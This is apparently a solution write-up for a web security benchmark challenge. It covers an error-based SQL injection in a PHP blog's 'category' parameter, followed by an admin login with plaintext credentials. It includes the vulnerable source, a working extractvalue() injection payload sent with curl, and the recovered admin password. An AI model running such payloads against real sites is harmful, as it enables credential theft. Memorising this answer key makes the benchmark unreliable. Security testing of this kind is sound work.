# XBEN-040-24 — SQLi Exfiltration (Error-Based Blind SQL Injection)

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Error-based SQL Injection via the `category` GET parameter on the blog home
page, followed by admin login with the extracted plaintext credentials. The filtered-posts query
later in `index.php` does escape `category`, but a *first*, unescaped "verify category exists"
query runs before it and both (a) reflects raw MySQL error text to the client and (b) is
injectable — a classic error-based oracle.

## Root cause (app/html/index.php)

```php
$unescaped_category = isset($_GET['category']) ? $_GET['category'] : '';

if (!empty($unescaped_category)) {
    // Verify category exists
    // Injection point
    $result = $conn->query("SELECT DISTINCT category FROM posts where category = '" . $unescaped_category ."'");

    if ($result === false) {
        die("Error in query: " . $conn->error);   // <-- raw DB error reflected to the client
    }
    ...
}
```

`admin.php` stores/compares the password in plaintext (`//plaintext` comment in source), so once
leaked it can be used directly to log in:

```php
$sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
...
if ($result->num_rows == 1) { $_SESSION['admin_logged_in'] = true; echo "@FLAG@"; }
```

## Exploit (copy-pasteable, port substituted for this run: 55300)

Step 1 — abuse MySQL's `extractvalue()` XPath error to exfiltrate the admins table through the
reflected error message:

```bash
PORT=55300
curl -s -G http://localhost:$PORT/index.php \
  --data-urlencode "category=x' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM admins LIMIT 1)))-- -"
```

Step 2 — log in to `admin.php` with the recovered plaintext credentials:

```bash
curl -s -X POST http://localhost:$PORT/admin.php \
  --data-urlencode "username=admin" \
  --data-urlencode "password=ONEverySecurePassword_!"
```
